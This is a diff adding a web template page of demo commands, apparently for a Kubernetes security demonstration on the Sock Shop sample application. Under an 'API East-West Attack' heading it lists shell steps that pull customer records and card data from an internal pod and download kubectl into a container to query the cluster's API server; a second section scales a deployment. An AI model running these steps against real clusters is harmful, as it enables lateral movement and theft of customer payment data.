@@ -1,0 +1,36 @@
+{% extends 'base.html' %}
+
+{% set active_page = 'scripts' %}
+
+{% block title %}Scripts & Instructions{% endblock %}
+
+{% block content %}
+
+    <div class="row mb-5">
+        <div class="col">
+            <h2><em>“Become good at cheating and you never need to become good at anything else.”</em></h2>
+            <div role="doc-subtitle">Banksy, sometime in 2005 (I think)</div>
+        </div>
+    </div>
+
+    <div class="row mt-5">
+
+        <div class="container-fluid">
+            <div class="col-12 left-bar bg-light output-panel p-4">
+                <h5 class="code-header">API East-West Attack from shell</h5>
+                <code>kubectl get pods -n sock-shop | grep user</code><br>
+                <code>wget http://100.96.32.15/customers</code><br>
+                <code>wget http://100.96.32.15/customers/57a98d98e4b00679b4a830af/cards</code><br>
+                <code>curl -LO "https://dl.k8s.io/release/$(curl -L -s
+                    https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"</code><br>
+                <code>chmod +x ./kubectl</code><br>
+                <code>./kubectl -s 172.20.57.107 get nodes -o wide</code><br><br>
+                <h5 class="code-header">Scale App</h5>
+                <code>kubectl -n sock-shop scale deployment --replicas 3 front-end</code><br>
+                <code>kubectl -n sock-shop get pods | grep front</code><br>
+            </div>
+        </div>
+
+    </div>
+
+{% endblock %}
